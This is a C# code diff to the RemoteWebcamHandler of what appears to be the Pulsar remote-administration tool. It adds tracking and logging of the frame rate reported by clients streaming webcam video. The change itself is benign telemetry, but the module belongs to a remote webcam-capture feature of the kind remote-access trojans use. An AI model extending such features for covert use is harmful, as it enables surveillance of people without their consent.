@@ -113,13 +113,22 @@ namespace Pulsar.Server.Messages
         private readonly int _defaultFrameRequestBatch = 3; // request 3 frames at a time now on
         private int _pendingFrames = 0;
         private readonly SemaphoreSlim _frameRequestSemaphore = new SemaphoreSlim(1, 1);
-        private readonly Stopwatch _frameReceiptStopwatch = new Stopwatch();
-        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
+        private readonly Stopwatch _frameReceiptStopwatch = new Stopwatch();        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
         private readonly int _fpsCalculationWindow = 10; // calculate FPS based on last 10 frames
 
         private readonly Stopwatch _performanceMonitor = new Stopwatch();
         private int _framesReceived = 0;
         private double _estimatedFps = 0;
+
+        /// <summary>
+        /// Stores the last FPS reported by the client.
+        /// </summary>
+        private float _lastReportedFps = -1f;
+
+        /// <summary>
+        /// Shows the last FPS reported by the client, or estimated FPS if not available.
+        /// </summary>
+        public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;
 
         /// <summary>
         /// Initializes a new instance of the <see cref="RemoteWebcamHandler"/> class using the given client.
@@ -210,16 +219,20 @@ namespace Pulsar.Server.Messages
         {
             Debug.WriteLine("Refreshing displays");
             _client.Send(new GetAvailableWebcams());
-        }
-
-        private async void Execute(ISender client, GetWebcamResponse message)
+        }        private async void Execute(ISender client, GetWebcamResponse message)
         {
             _framesReceived++;
+
+            // Capture client-reported FPS if available
+            if (message.FrameRate > 0)
+            {
+                _lastReportedFps = message.FrameRate;
+            }
 
             if (_performanceMonitor.ElapsedMilliseconds >= 1000)
             {
                 _estimatedFps = _framesReceived / (_performanceMonitor.ElapsedMilliseconds / 1000.0);
-                Debug.WriteLine($"Estimated FPS: {_estimatedFps:F1}, Frames received: {_framesReceived}");
+                Debug.WriteLine($"Client FPS: {_lastReportedFps:F1}, Estimated FPS: {_estimatedFps:F1}, Frames received: {_framesReceived}");
                 _framesReceived = 0;
                 _performanceMonitor.Restart();
             }
